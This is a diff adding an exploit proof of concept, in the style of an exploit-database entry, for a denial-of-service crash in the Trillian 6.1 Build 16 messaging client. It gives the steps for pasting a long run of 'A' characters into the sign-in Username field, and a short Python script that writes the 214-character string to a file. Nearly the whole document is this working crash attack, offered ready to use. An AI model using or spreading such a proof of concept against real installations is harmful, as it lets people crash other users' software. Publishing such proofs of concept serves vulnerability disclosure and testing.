@@ -1,0 +1,21 @@
+#Exploit Title: Trillian 6.1 Build 16 - "Sign In" Denial of service (PoC)
+#Discovery by: Jose Miguel Gonzalez
+#Discovery Date; 2018-08-29
+#Vendor Homepage: https://www.trillian.im/
+#Software Link: https://www.trillian.im/download/
+#Tested Version: 6.1 Build 16
+#Tested on OS: Windows 10 Single Language x64
+
+#Steps to produce the crash
+#1.- Run the python code: trillian.py
+#2.- Open trillian.txt and copy context to clipboard
+#3.- Open Trillian application
+#4.- Paste clipboard on "Username"
+#5.- Put "1234" on "Password"
+#5.- Sign In
+#6.- Crashed
+
+mem = "\x41" * 214
+f = open ("trillian.txt", "w")
+f.write(mem)
+f.close()
